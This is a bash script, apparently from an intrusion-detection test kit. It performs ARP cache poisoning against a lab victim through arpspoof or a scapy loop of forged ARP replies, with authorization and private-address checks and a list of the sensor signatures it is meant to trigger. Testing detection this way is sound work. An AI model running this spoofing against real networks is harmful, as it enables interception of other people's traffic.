#!/usr/bin/env bash
# arp-spoof.sh - ARP cache poisoning against a lab victim.
# Needs: arpspoof (dsniff) OR python3+scapy, root.
# Triggers: sid 1000802 (binding changed MAC), 1000803 (flip-flop),
#           1000804 (unsolicited replies). ARP alerts are keyed on the
#           observed MAC, so the sensor reports them as reliable.
. "$(cd "$(dirname "$0")" && pwd)/_lib.sh"

usage() { cat <<U
Usage: $PROG --i-have-authorization -t VICTIM -g GATEWAY [-i IFACE]
  -t VICTIM    the host to poison
  -g GATEWAY   the address to impersonate to the victim (e.g. the router)
  -i IFACE     interface to send on (default: system route to the victim)
Tells VICTIM that GATEWAY is at this host's MAC. Stop with Ctrl-C.
U
}

VICTIM=""; GATEWAY=""; IFACE=""
while [ $# -gt 0 ]; do
  case $1 in
    --i-have-authorization) AUTHORIZED=1 ;;
    -t|--target|--victim) VICTIM=${2:?}; shift ;;
    -g|--gateway) GATEWAY=${2:?}; shift ;;
    -i|--iface) IFACE=${2:?}; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "unknown argument: $1 (see --help)" ;;
  esac
  shift
done

[ -n "$GATEWAY" ] || die "need -g GATEWAY (see --help)"
is_private_ipv4 "$GATEWAY" || die "gateway $GATEWAY is not a private/lab address"
need_root
authorize "$VICTIM"

if command -v arpspoof >/dev/null 2>&1; then
  set -x
  exec arpspoof ${IFACE:+-i "$IFACE"} -t "$VICTIM" "$GATEWAY"
fi
python3 -c 'import scapy' 2>/dev/null || die "need arpspoof (dsniff) or scapy"
export VICTIM GATEWAY IFACE
exec python3 - <<'PY'
import os, time
from scapy.all import ARP, send, conf
victim = os.environ["VICTIM"]; gw = os.environ["GATEWAY"]
iface = os.environ.get("IFACE") or conf.iface
pkt = ARP(op=2, pdst=victim, psrc=gw)  # "gw is-at <my mac>" to the victim
print(f"poisoning {victim}: {gw} is-at this host, every 2s on {iface} (Ctrl-C to stop)")
try:
    while True:
        send(pkt, iface=iface, verbose=0)
        time.sleep(2)
except KeyboardInterrupt:
    print("stopped")
PY
